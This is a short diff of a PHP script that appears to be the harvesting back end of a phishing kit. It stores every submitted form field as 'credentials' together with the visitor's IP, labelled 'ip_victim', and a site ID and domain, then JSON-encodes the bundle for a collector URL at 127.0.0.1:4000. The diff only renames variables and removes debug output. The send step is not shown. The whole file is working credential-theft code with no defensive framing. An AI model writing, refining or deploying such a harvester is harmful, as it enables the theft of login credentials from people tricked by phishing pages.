@@ -1,29 +1,31 @@
 <?php
 
 $url = "http://127.0.0.1:4000";
-$ip_vicos = $_SERVER['REMOTE_ADDR'];
+$ip_victim = $_SERVER['REMOTE_ADDR'];
 
 $siteIdPath = 'site_id.txt';
 if (file_exists($siteIdPath)) {
     $siteId = file_get_contents($siteIdPath);
 }
 else{
-    $siteId = "not specified >:(";
+    $siteId = "NaN";
 }
 
-if ($_SERVER["REQUEST_METHOD"]==='POST'){
-    $keys = $_POST;
-    var_dump($keys);
+$domainPath = 'domain_name.txt';
+if (file_exists($domainPath)) {
+    $domain = file_get_contents($domainPath);
 }
-if ($_SERVER["REQUEST_METHOD"]==='GET'){
-    $keys = $_GET;
-    var_dump($keys);    
+else{
+    $domain = "NaN";
 }
+
+if ($_SERVER["REQUEST_METHOD"]==='POST') $keys = $_POST;
+if ($_SERVER["REQUEST_METHOD"]==='GET') $keys = $_GET;
 
 $data = json_encode([
     'site_id' => $siteId,
     'credentials' => json_encode($keys),
-    'ip_victim' => $ip_vicos
+    'ip_victim' => $ip_victim
 ]);
 
 
